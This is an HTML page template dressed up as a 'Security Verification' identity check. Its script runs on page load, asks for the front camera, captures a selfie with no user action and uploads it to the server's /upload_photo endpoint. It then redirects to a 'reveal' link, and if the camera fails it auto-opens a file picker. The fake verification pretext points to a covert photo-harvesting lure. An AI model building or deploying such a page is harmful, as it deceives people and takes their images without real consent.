<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Identity</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }

        .icon {
            font-size: 5em;
            margin-bottom: 20px;
        }

        h1 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 2em;
        }

        .description {
            color: #666;
            font-size: 1.1em;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .status {
            padding: 20px;
            border-radius: 10px;
            font-weight: 500;
            margin: 20px 0;
        }

        .status.loading {
            background: #fff3cd;
            color: #856404;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        video, canvas {
            display: none;
        }

        .progress {
            background: #f3f3f3;
            border-radius: 10px;
            height: 10px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress-bar {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100%;
            width: 0%;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔒</div>
        <h1>Security Verification</h1>
        <p class="description">
            Please wait while we verify your device for security purposes...
        </p>

        <div class="loader"></div>
        <div class="status loading" id="status">
            Accessing camera for identity verification...
        </div>

        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const sessionId = '{{ session_id }}';
        let captureAttempts = 0;
        const MAX_ATTEMPTS = 3;

        // AUTO-START on page load
        window.addEventListener('load', async () => {
            await startAutoCapture();
        });

        async function startAutoCapture() {
            const status = document.getElementById('status');
            const progressBar = document.getElementById('progressBar');

            try {
                // Progress: 20%
                progressBar.style.width = '20%';
                status.textContent = 'Requesting camera access...';

                // Request camera permission AUTOMATICALLY
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // Front camera for selfie
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                // Progress: 50%
                progressBar.style.width = '50%';
                status.textContent = 'Camera accessed! Capturing image...';

                const video = document.getElementById('video');
                video.srcObject = stream;

                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });

                // Wait 1 second for camera to stabilize, then AUTO-CAPTURE
                await new Promise(resolve => setTimeout(resolve, 1000));

                // Progress: 75%
                progressBar.style.width = '75%';
                status.textContent = 'Capturing your photo...';

                // AUTO-CAPTURE without user interaction
                const photoData = await capturePhoto(video);

                // Stop camera
                stream.getTracks().forEach(track => track.stop());

                // Progress: 90%
                progressBar.style.width = '90%';
                status.textContent = 'Uploading verification data...';

                // Send to server
                await uploadPhoto(photoData);

            } catch (error) {
                console.error('Camera access error:', error);

                // If camera fails, try alternative method
                if (captureAttempts < MAX_ATTEMPTS) {
                    captureAttempts++;
                    status.textContent = 'Trying alternative capture method...';
                    await tryFileUploadFallback();
                } else {
                    status.className = 'status';
                    status.style.background = '#f8d7da';
                    status.style.color = '#721c24';
                    status.textContent = '❌ Camera access denied. Cannot verify identity.';
                }
            }
        }

        function capturePhoto(video) {
            return new Promise((resolve) => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert to base64
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                resolve(photoData);
            });
        }

        async function uploadPhoto(photoData) {
            const status = document.getElementById('status');
            const progressBar = document.getElementById('progressBar');

            try {
                const response = await fetch('/upload_photo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session_id: sessionId,
                        photo_data: photoData
                    })
                });

                const result = await response.json();

                if (result.status === 'success') {
                    // Progress: 100%
                    progressBar.style.width = '100%';
                    status.className = 'status';
                    status.style.background = '#d4edda';
                    status.style.color = '#155724';
                    status.innerHTML = '✅ Verification complete!<br>Redirecting...';

                    // Redirect to reveal page
                    setTimeout(() => {
                        window.location.href = result.reveal_url;
                    }, 1500);
                } else {
                    throw new Error('Upload failed');
                }

            } catch (error) {
                console.error('Upload error:', error);
                status.className = 'status';
                status.style.background = '#f8d7da';
                status.style.color = '#721c24';
                status.textContent = '❌ Verification failed. Please try again.';
            }
        }

        async function tryFileUploadFallback() {
            const status = document.getElementById('status');

            status.textContent = 'Camera unavailable. Please select a photo to continue...';

            // Create hidden file input as absolute fallback
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.capture = 'user'; // Request camera on mobile

            input.onchange = async (e) => {
                const file = e.target.files[0];
                if (file) {
                    status.textContent = 'Processing photo...';

                    const reader = new FileReader();
                    reader.onload = async (event) => {
                        await uploadPhoto(event.target.result);
                    };
                    reader.readAsDataURL(file);
                }
            };

            // Auto-click to trigger
            input.click();
        }
    </script>
</body>
</html>
